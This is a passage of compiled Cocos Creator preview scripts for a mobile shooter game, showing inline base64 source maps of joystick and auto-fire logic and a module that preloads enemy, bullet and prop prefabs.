HkucHJlcGFyZUd1biA+IDApe1xyXG4gICAgICAgICAgICB0aGlzLmJ1bGxldEVtaXR0ZXIgPSBHYW1lUHJveHkucHJlcGFyZUd1bjtcclxuICAgICAgICAgICAgdGhpcy5idWxsZXRFbWl0dGVyRGVsZWdhdGUucGF5bG9hZCA9IHRoaXMuYnVsbGV0RW1pdHRlckRlbGVnYXRlLnBheWxvYWQgKiAzO1xyXG4gICAgICAgICAgICBHYW1lUHJveHkucHJlcGFyZUd1biA9IDA7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgdGhpcy5idWxsZXRFbWl0dGVyID0gQnVsbGV0RW1pdHRlci5UWVBFUy5TaG91UWlhbmc7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIC8qKiDlj5HlsITmjqfliLYgKi9cclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKEFjdGlvbnMudXBkYXRlKGR0ID0+IHtcclxuICAgICAgICAgICAgaWYgKEdhbWVQcm94eS5wYXVzZUdhbWUgfHwgR2FtZVByb3h5LnNsb3dHYW1lKXJldHVybjtcclxuICAgICAgICAgICAgaWYgKHRoaXMuX2ZpcmVDRCA+IDApe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fZmlyZUNEIC09IGR0O1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIC8qKiDmib7liLDnprvop5LluqbmnIDov5HnmoTmlYzkurogKi9cclxuICAgICAgICAgICAgbGV0IGVuZW15Tm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuICAgICAgICAgICAgbGV0IG1pblN1YiA9IG51bGw7XHJcbiAgICAgICAgICAgIGxldCBtaW5EaXN0YW5jZSA9IHRoaXMuYnVsbGV0RW1pdHRlckRlbGVnYXRlLmZpcmluZ1JhbmdlO1xyXG4gICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhtaW5EaXN0YW5jZSwgXCJtaW5EaXN0YW5jZVwiKTtcclxuICAgICAgICAgICAgdGhpcy5fc2NyZWVuUmVjdC54ID0gLXRoaXMuX2JnTm9kZS54IC0gY2MudmlzaWJsZVJlY3QuY2VudGVyLng7XHJcbiAgICAgICAgICAgIHRoaXMuX3NjcmVlblJlY3QueSA9IC10aGlzLl9iZ05vZGUueSAtIGNjLnZpc2libGVSZWN0LmNlbnRlci55O1xyXG4gICAgICAgICAgICBsZXQgcm9sZVBvcyA9IHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uO1xyXG4gICAgICAgICAgICBnYW1lRW5lbXlzQ29udHJvbGxlci5lbmVteUxheWVyLmNoaWxkcmVuLmZvckVhY2godmFsdWUgPT4ge1xyXG4gICAgICAgICAgICAgICAgaWYgKHZhbHVlLmFjdGl2ZSAmJiB2YWx1ZS5nZXRDb21wb25lbnQoRW5lbXkpLmhwID4gMCAmJiB0aGlzLl9zY3JlZW5SZWN0LmNvbnRhaW5zKHZhbHVlLnBvc2l0aW9uKSl7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IHN1YiA9IHZhbHVlLnBvc2l0aW9uLnN1Yihyb2xlUG9zKTtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbWFnID0gc3ViLm1hZygpO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChtYWcgPCBtaW5EaXN0YW5jZSl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1pblN1YiA9IHN1YjtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbWluRGlzdGFuY2UgPSBtYWc7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVuZW15Tm9kZSA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIGlmIChlbmVteU5vZGUpe1xyXG4gICAgICAgICAgICAgICAgLyoqIOi9rOWQkeaVjOS6uiAqL1xyXG4gICAgICAgICAgICAgICAgdGhpcy50dXJuVG8obWluU3ViKTtcclxuICAgICAgICAgICAgICAgIGlmICh0aGlzLl9maXJlQ0QgPD0gMCl7XHJcbiAgICAgICAgICAgICAgICAgICAgLyoqIOagueaNruaUu+WHu+i3neemu+iuoeeul+aUu+WHu+WkueinkiAqL1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBhdHRhY2tSYWRpYW4gPSBNYXRoLmF0YW4oZW5lbXlOb2RlLmdldENvbXBvbmVudChFbmVteSkuc3BhY2VDaXJjbGVDb2xsaWRlci5yYWRpdXMvbWluRGlzdGFuY2UpO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChtaW5TdWIuYW5nbGUoY2MudjIoMCwgMSkucm90YXRlKGNjLm1pc2MuZGVncmVlc1RvUmFkaWFucygtdGhpcy5yb2xlLm5vZGUucm90YXRpb24pKSkgPCBhdHRhY2tSYWRpYW4pe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAvKiogZmlyZSAqL1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB0aGlzLl9maXJlQ0QgPSB0aGlzLmJ1bGxldEVtaXR0ZXJEZWxlZ2F0ZS5pbnRlcnZhbDtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRpciA9IGVuZW15Tm9kZS5wb3NpdGlvbi5zdWIocm9sZVBvcykubm9ybWFsaXplKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkaXIueCA9PSAwICYmIGRpci55ID09IDApe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlyID0gY2MudjIoMCwgMSkubm9ybWFsaXplKCkucm90YXRlKGNjLm1pc2MuZGVncmVlc1RvUmFkaWFucygtdGhpcy5yb2xlLm5vZGUucm90YXRpb24pKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAodGhpcy5fYnVsbGV0RW1pdHRlciA9PSBCdWxsZXRFbWl0dGVyLlRZUEVTLkp1SmlRaWFuZyl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgYnVsbGV0U3RyaWtlUHJlZmFiID0gY2MubG9hZGVyLmdldFJlcyhcInByZWZhYi9lbnRpdGllcy9idWxsZXQvZmlyZTdcIik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgYnVsbGV0U3RyaWtlTm9kZSA9IGNjLmluc3RhbnRpYXRlKGJ1bGxldFN0cmlrZVByZWZhYik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmJ1bGxldFN0cmlrZUxheWVyLmFkZENoaWxkKGJ1bGxldFN0cmlrZU5vZGUpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlTm9kZS5wb3NpdGlvbiA9IHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLmFkZChkaXIubXVsKHRoaXMucm9sZS5ndW5Ub3BOb2RlLnkpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldFN0cmlrZU5vZGUucm90YXRpb24gPSA5MCAtIGNjLm1pc2MucmFkaWFuc1RvRGVncmVlcyhNYXRoLmF0YW4yKGRpci55LCBkaXIueCkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlTm9kZS5nZXRDb21wb25lbnQoc3AuU2tlbGV0b24pLnNldENvbXBsZXRlTGlzdGVuZXIoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXRTdHJpa2VOb2RlLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHRoaXMuX2J1bGxldEVtaXR0ZXIgIT09IEJ1bGxldEVtaXR0ZXIuVFlQRVMuSmlHdWFuZyAmJiB0aGlzLl9idWxsZXRFbWl0dGVyICE9PSBCdWxsZXRFbWl0dGVyLlRZUEVTLlBlblppKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMucm9sZS5maXJlU3ByaXRlLm5vZGUuc2NhbGUgPSAxO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5yb2xlLmZpcmVTcHJpdGUubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5yb2xlLmZpcmVTcHJpdGUubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2Muc2NhbGVUbygwLjA1LCAwLjUpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMucm9sZS5maXJlU3ByaXRlLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuX2J1bGxldEVtaXR0ZXJEZWxlZ2F0ZS5maXJlKHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLmFkZChkaXIubXVsKHRoaXMucm9sZS5ndW5Ub3BOb2RlLnkpKSwgZGlyKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHN0ciA9ICdzb3VuZC9tc2NfZycrKCBcIjAwMDAwMDAwMDAwMDAwMDBcIiArIHRoaXMuX2J1bGxldEVtaXR0ZXIgKS5zdWJzdHIoIC0zICk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIE11c2ljLnBsYXlTRlgoc3RyLCBFbWl0dGVyU2Z4Vm9sdW1lc1t0aGlzLl9idWxsZXRFbWl0dGVyLTFdKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHRoaXMuX2J1bGxldEVtaXR0ZXJEZWxlZ2F0ZS5pc1VzZVVwKCkpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5idWxsZXRFbWl0dGVyID0gQnVsbGV0RW1pdHRlci5UWVBFUy5TaG91UWlhbmc7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgfSkpXHJcbiAgICB9XHJcblxyXG4gICAgdHVyblRvKGRpcjpjYy5WZWMyKXtcclxuICAgICAgICBsZXQgZGVncmVlID0gKDkwIC0gY2MubWlzYy5yYWRpYW5zVG9EZWdyZWVzKE1hdGguYXRhbjIoZGlyLnksIGRpci54KSkpJTM2MDtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcImRlPT09PlwiLCBkZWdyZWUpO1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwiZGlyPT09Png9XCIrZGlyLngrXCIgeT1cIitkaXIueSk7XHJcbiAgICAgICAgaWYgKGRlZ3JlZSA8IDApe1xyXG4gICAgICAgICAgICBkZWdyZWUgKz0gMzYwO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgZW5lbXlSb3RhdGlvbiA9IHRoaXMucm9sZS5ub2RlLnJvdGF0aW9uJTM2MDtcclxuICAgICAgICBpZiAoZW5lbXlSb3RhdGlvbiA8IDApe1xyXG4gICAgICAgICAgICBlbmVteVJvdGF0aW9uICs9IDM2MDtcclxuICAgICAgICB9XHJcbiAgICAgICAgbGV0IHN1YkRlZ3JlZSA9IE1hdGguYWJzKGRlZ3JlZSAtIGVuZW15Um90YXRpb24pO1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwiZGVncmVlPVwiK2RlZ3JlZSk7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2coXCJlbmVteVJvdGF0aW9uPT09PT5cIitlbmVteVJvdGF0aW9uKTtcclxuICAgICAgICBpZiAoc3ViRGVncmVlID4gMCl7XHJcbiAgICAgICAgICAgIGxldCByb3RhdGlvbiA9IDA7XHJcbiAgICAgICAgICAgIGlmIChzdWJEZWdyZWUgPiAxODApe1xyXG4gICAgICAgICAgICAgICAgcm90YXRpb24gPSBNYXRoLnNpZ24oZW5lbXlSb3RhdGlvbiAtIGRlZ3JlZSkgKiAxMDtcclxuICAgICAgICAgICAgICAgIGlmIChNYXRoLmFicyhyb3RhdGlvbikgPiAzNjAgLSBzdWJEZWdyZWUpe1xyXG4gICAgICAgICAgICAgICAgICAgIHJvdGF0aW9uID0gTWF0aC5zaWduKHJvdGF0aW9uKSooMzYwLXN1YkRlZ3JlZSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgIHJvdGF0aW9uID0gTWF0aC5zaWduKGRlZ3JlZSAtIGVuZW15Um90YXRpb24pICogMTA7XHJcbiAgICAgICAgICAgICAgICBpZiAoTWF0aC5hYnMocm90YXRpb24pID4gc3ViRGVncmVlKXtcclxuICAgICAgICAgICAgICAgICAgICByb3RhdGlvbiA9IE1hdGguc2lnbihyb3RhdGlvbikgKiBzdWJEZWdyZWU7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgZW5lbXlSb3RhdGlvbiArPSByb3RhdGlvbjtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5yb2xlLm5vZGUucm90YXRpb24gPSBlbmVteVJvdGF0aW9uO1xyXG4gICAgfVxyXG5cclxuICAgIG9uRGVzdHJveSgpe1xyXG4gICAgICAgIHRoaXMubm9kZS5vZmYoY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfU1RBUlQsIHRoaXMub25Ub3VjaFN0YXJ0LCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub2ZmKGNjLk5vZGUuRXZlbnRUeXBlLlRPVUNIX01PVkUsIHRoaXMub25Ub3VjaE1vdmUsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vZmYoY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfRU5ELCB0aGlzLm9uVG91Y2hFbmQsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vZmYoY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfQ0FOQ0VMLCB0aGlzLm9uVG91Y2hFbmQsIHRoaXMpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uVG91Y2hTdGFydChldmVudDpjYy5FdmVudC5FdmVudFRvdWNoKXtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcIm9uVG91Y2hTdGFydD09PT5cIiwgdGhpcy5fdG91Y2hJZCwgR2FtZVByb3h5LnBhdXNlR2FtZSk7XHJcbiAgICAgICAgaWYgKHRoaXMuX3RvdWNoSWQgPT0gbnVsbCl7XHJcbiAgICAgICAgICAgIHRoaXMudG91Y2hJZCA9IGV2ZW50LmdldElEKCk7XHJcbiAgICAgICAgICAgIHRoaXMuX2JNb3ZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgIHRoaXMucmluZy5vcGFjaXR5ID0gUklOR19PUEFDSVRZO1xyXG4gICAgICAgICAgICB0aGlzLmRvdC5vcGFjaXR5ID0gUklOR19PUEFDSVRZO1xyXG4gICAgICAgICAgICAvLyDmm7TmlLnmkYfmnYbnmoTkvY3nva5cclxuICAgICAgICAgICAgdGhpcy5yaW5nLnNldFBvc2l0aW9uKGV2ZW50LmdldExvY2F0aW9uKCkuc3ViKGNjLnZpc2libGVSZWN0LmNlbnRlcikpO1xyXG4gICAgICAgICAgICB0aGlzLmRvdC5zZXRQb3NpdGlvbihjYy52MigwLCAwKSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIG9uVG91Y2hNb3ZlKGV2ZW50OmNjLkV2ZW50LkV2ZW50VG91Y2gpe1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwib25Ub3VjaE1vdmU9PT0+XCIsIHRoaXMuX3RvdWNoSWQsIEdhbWVQcm94eS5wYXVzZUdhbWUpO1xyXG4gICAgICAgIGlmICghR2FtZVByb3h5LnBhdXNlR2FtZSAmJiBldmVudC5nZXRJRCgpID09IHRoaXMuX3RvdWNoSWQpe1xyXG4gICAgICAgICAgICB0aGlzLl9iTW92ZSA9IHRydWU7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLmd1aWRlTm9kZS5hY3RpdmUgJiYgdGhpcy5kb3QucG9zaXRpb24ubWFnKCkgPiAzMCl7XHJcbiAgICAgICAgICAgICAgICB0aGlzLmd1aWRlTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgIFdvcmxkLk15Lm5ld2JpZXMuZmluaXNoKFwiRmlyc3RFbnRyeUdhbWVcIik7XHJcbiAgICAgICAgICAgICAgICB0aGlzLmdldENvbXBvbmVudChHYW1lQ29udHJvbGxlcikuc3RhcnRHZW5lcmF0aW5nKCk7XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGxldCBwb3MgPSB0aGlzLmRvdC5wb3NpdGlvbi5hZGQoZXZlbnQuZ2V0RGVsdGEoKSk7XHJcbiAgICAgICAgICAgIHRoaXMuX2RpciA9IHBvcy5ub3JtYWxpemUoKTtcclxuICAgICAgICAgICAgaWYgKHBvcy5tYWcoKSA+PSB0aGlzLl9yYWRpdXMpe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kb3QucG9zaXRpb24gPSB0aGlzLl9kaXIubXVsKHRoaXMuX3JhZGl1cyk7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnJvbGUuc3BlZWRUeXBlID0gU3BlZWRUeXBlLkZBU1Q7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnJpbmcucG9zaXRpb24gPSBldmVudC5nZXRMb2NhdGlvbigpLnN1YihjYy52aXNpYmxlUmVjdC5jZW50ZXIpLnN1Yih0aGlzLmRvdC5wb3NpdGlvbik7XHJcbiAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuZG90LnBvc2l0aW9uID0gcG9zO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5yb2xlLnNwZWVkVHlwZSA9IFNwZWVkVHlwZS5OT1JNQUw7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25Ub3VjaEVuZChldmVudDpjYy5FdmVudC5FdmVudFRvdWNoKXtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcIm9uVG91Y2hFbmQ9PT0+XCIsIHRoaXMuX3RvdWNoSWQsIEdhbWVQcm94eS5wYXVzZUdhbWUpO1xyXG4gICAgICAgIGlmICghR2FtZVByb3h5LnBhdXNlR2FtZSAmJiBldmVudC5nZXRJRCgpID09IHRoaXMuX3RvdWNoSWQpe1xyXG4gICAgICAgICAgICB0aGlzLnRvdWNoSWQgPSBudWxsO1xyXG4gICAgICAgICAgICB0aGlzLl9iTW92ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICB0aGlzLmRvdC5zZXRQb3NpdGlvbih0aGlzLnJpbmcuZ2V0UG9zaXRpb24oKSk7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLmpveXN0aWNrVHlwZSA9PSBKb3lzdGlja1R5cGUuRk9MTE9XKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnJpbmcub3BhY2l0eSA9IDA7XHJcbiAgICAgICAgICAgICAgICB0aGlzLmRvdC5vcGFjaXR5ID0gMDtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAvLyB0aGlzLnJvbGUuc3BlZWRUeXBlID0gU3BlZWRUeXBlLlNUT1A7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/PreloadGameSceneCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'cf93bRhBi5KuIVrHFENupQS', 'PreloadGameSceneCommand');
// script/app/game/PreloadGameSceneCommand.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var PreloadGameSceneCommand = /** @class */ (function () {
    function PreloadGameSceneCommand() {
    }
    PreloadGameSceneCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            Promise.all([
                                cc.loader.loadResAwait("prefab/entities/enemy/enemy1", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/enemy/enemy2", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/enemy/enemy3", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/enemy/enemy4", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/enemy/enemy5", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/enemy/enemy6", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/enemy/enemy7", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/enemy/enemy8", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet1", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet1Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet2", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet2Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet3", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet3Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet4", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet4Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet5", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet5Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet6", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet6Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet7", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet7Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet8", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet8Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet9", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet9Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet10", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet10Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet108", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/bullet108Strike", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/fire7", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/explosive/explosive9", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/enemyBullet1", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/enemyBullet2", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/enemyBullet3", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/propBullet1", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/propBullet2", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/propBullet3", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/propBullet4", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/propBullet5", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/bullet/propBullet6", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop1", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop2", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop3", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop4", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop5", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop6", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop9", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop10", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop11", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop12", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/prop13", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/guns", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/propState", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/prop/takeProp", cc.Prefab),
                                cc.loader.loadResAwait("prefab/entities/blood/blood", cc.Prefab),
                                cc.loader.loadResAwait("prefab/roleSupply", cc.Prefab),
                            ]).then(function (res) {
                                resolve();
                            }).catch(function (err) {
                                reject(err);
                            });
                            return [2 /*return*/];
                        });
                    }); })];
            });
        });
    };
    PreloadGameSceneCommand = __decorate([
        ccclass("PreloadGameSceneCommand")
    ], PreloadGameSceneCommand);
    return PreloadGameSceneCommand;
}());
exports.default = PreloadGameSceneCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvUHJlbG9hZEdhbWVTY2VuZUNvbW1hbmQudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUtNLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQUE7SUF1RUEsQ0FBQztJQXJFUyx5Q0FBTyxHQUFiO1FBQWUsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCx5QkFBTzs7dUNBQUUsT0FBTzs7O2dCQUMzQixzQkFBTyxJQUFJLE9BQU8sQ0FBQyxVQUFNLE9BQU8sRUFBRSxNQUFNOzs0QkFDcEMsT0FBTyxDQUFDLEdBQUcsQ0FBQztnQ0FDUixFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMs